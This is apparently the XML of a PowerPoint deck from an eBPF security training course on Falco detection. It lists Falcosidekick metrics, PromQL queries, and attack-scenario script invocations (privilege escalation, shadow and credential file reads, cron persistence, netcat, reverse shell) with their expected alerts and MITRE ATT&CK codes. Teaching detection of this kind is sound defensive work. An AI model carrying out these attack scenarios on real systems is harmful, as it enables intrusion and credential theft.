          <a:solidFill>
            <a:srgbClr val="16213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595360" cy="21945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768096"/>
            <a:ext cx="84490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metriques_falcosidekick.txt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841248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Metrics exposees par Falcosidekick (:2801/metrics)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Compteur total par règle et priorite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falco_events_total{rule="Reverse Shell",priority="Critical"} 3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 priorite uniquement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falco_events_total{priority="High"}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22860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PromQL queries for the Grafana dashboard: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15184"/>
          <a:ext cx="859536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40233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PromQL query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Utilite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increase(falco_events_total{priority="Critical"}[15m])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Alertes CRITICAL des 15 dernieres minutes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 by (priority) (increase(falco_events_total[1h]))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Repartition par priorite sur 1 heure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topk(10, increase(falco_events_total[1h]))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10 règles les plus declenchees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absent(falco_events_total)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if Falco produces no alerts (detect a failure)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rate(falco_events_total[2m])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 rate per second over a 2-minute sliding window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Scenarios d'attaque et alertes attendues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25196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22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84124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Privilege escalation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53312"/>
            <a:ext cx="4078224" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="162130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3968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./scripts/attack-scenarios.sh privesc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664208"/>
            <a:ext cx="4078224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" y="1664208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: Privilege Escalation via setuid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1993392"/>
            <a:ext cx="4078224" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E6FBF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" y="1993392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: SUID Binary Exécution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09160" y="749808"/>
            <a:ext cx="425196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82296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822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49240" y="84124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Accès fichiers sensibles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1353312"/>
            <a:ext cx="4078224" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="162130"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4855464" y="1371600"/>
            <a:ext cx="3968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./scripts/attack-scenarios.sh files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800600" y="1664208"/>
            <a:ext cx="4078224" cy="2743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4855464" y="1664208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: Shadow File Read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800600" y="1993392"/>
            <a:ext cx="4078224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4855464" y="1993392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: Cloud Credentials Access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00600" y="2322576"/>
            <a:ext cx="4078224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4855464" y="2322576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: Persistence via Cron Write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2852928"/>
            <a:ext cx="425196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292608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4400" y="294436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Exfiltration réseau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3456432"/>
            <a:ext cx="4078224" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="162130"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="420624" y="3474720"/>
            <a:ext cx="3968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./scripts/attack-scenarios.sh network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3767328"/>
            <a:ext cx="4078224" cy="2743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3" name="Text 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="420624" y="3767328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: Netcat Exécution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4096512"/>
            <a:ext cx="4078224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5" name="Text 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="420624" y="4096512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: Reverse Shell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" y="4425696"/>
            <a:ext cx="4078224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7" name="Text 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="420624" y="4425696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: Shell from Web Service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09160" y="2852928"/>
            <a:ext cx="425196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00600" y="29260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349240" y="294436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Chaine complete EDR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800600" y="3456432"/>
            <a:ext cx="4078224" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="162130"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Text 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4855464" y="3474720"/>
            <a:ext cx="3968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./scripts/attack-scenarios.sh edr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800600" y="3767328"/>
            <a:ext cx="4078224" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E6FBF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Text 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4855464" y="3767328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complete : accès -&gt; recon -&gt; credentials -&gt; escalade -&gt; exfiltration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MITRE ATT&amp;CK Mapping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4251960" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2E4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15568"/>
            <a:ext cx="4572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15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6384" y="115214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Privilege Escalation via setuid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0" y="1207008"/>
            <a:ext cx="969264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207008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T1548.001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4251960" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2E44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45920"/>
            <a:ext cx="45720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6384" y="168249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 Modification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0" y="1737360"/>
            <a:ext cx="969264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1737360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T1548.003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2176272"/>
            <a:ext cx="4251960" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2E44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176272"/>
            <a:ext cx="45720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6384" y="221284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SUID Binary Exécution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74720" y="2267712"/>
            <a:ext cx="969264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2267712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T1548.001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2706624"/>
            <a:ext cx="4251960" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2E44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706624"/>
            <a:ext cx="45720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2706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86384" y="274320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File Read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74720" y="2798064"/>
            <a:ext cx="969264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0" y="2798064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T1003.008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3236976"/>
            <a:ext cx="4251960" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2E44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236976"/>
            <a:ext cx="45720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3236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86384" y="327355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Private Key Access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74720" y="3328416"/>
            <a:ext cx="969264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4" name="Text 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3474720" y="3328416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T1552.004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3767328"/>
            <a:ext cx="4251960" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2E4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3767328"/>
            <a:ext cx="4572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3767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86384" y="380390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Credentials Access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474720" y="3858768"/>
            <a:ext cx="969264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0" name="Text 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3474720" y="3858768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T1552.001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709160" y="1115568"/>
            <a:ext cx="4251960" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2E4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09160" y="1115568"/>
            <a:ext cx="4572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3" name="Text 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4709160" y="1115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21224" y="115214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 via Cron Write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909560" y="1207008"/>
            <a:ext cx="969264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6" name="Text 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7909560" y="1207008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T1053.003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709160" y="1645920"/>
            <a:ext cx="4251960" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2E4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09160" y="1645920"/>
            <a:ext cx="4572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9" name="Text 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="470916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221224" y="168249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LD_PRELOAD Manipulation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909560" y="1737360"/>
            <a:ext cx="969264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2" name="Text 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7909560" y="1737360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T1574.006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709160" y="2176272"/>
            <a:ext cx="4251960" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2E4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09160" y="2176272"/>
            <a:ext cx="4572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5" name="Text 53"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4709160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221224" y="221284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Shell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909560" y="2267712"/>
            <a:ext cx="969264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8" name="Text 56"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7909560" y="2267712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T1059.004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709160" y="2706624"/>
            <a:ext cx="4251960" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2E4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09160" y="2706624"/>
            <a:ext cx="4572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1" name="Text 59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4709160" y="2706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221224" y="274320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 from Web Service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909560" y="2798064"/>
            <a:ext cx="969264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4" name="Text 62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7909560" y="2798064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T1505.003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709160" y="3236976"/>
            <a:ext cx="4251960" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2E44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709160" y="3236976"/>
            <a:ext cx="45720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7" name="Text 65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4709160" y="3236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5221224" y="327355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Netcat Exécution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7909560" y="3328416"/>
            <a:ext cx="969264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70" name="Text 68"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7909560" y="3328416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T1095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709160" y="3767328"/>
            <a:ext cx="4251960" cy="4572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709160" y="3767328"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E6FBF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73" name="Text 71"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4709160" y="3767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5221224" y="380390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Frequency DNS Queries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7909560" y="3858768"/>
            <a:ext cx="969264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76" name="Text 74"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7909560" y="3858768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T1071.004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274320" y="471830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detection rules • 3 threat families • 100% open source (Falco CNCF graduated)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eBPF Track B - Security &amp; Behavioral Detection</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>Formation eBPF</dc:creator>
  <cp:lastModifiedBy>Formation eBPF</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-04-05T12:28:50Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-04-05T12:28:50Z</dcterms:modified>
</cp:coreProperties>
</file>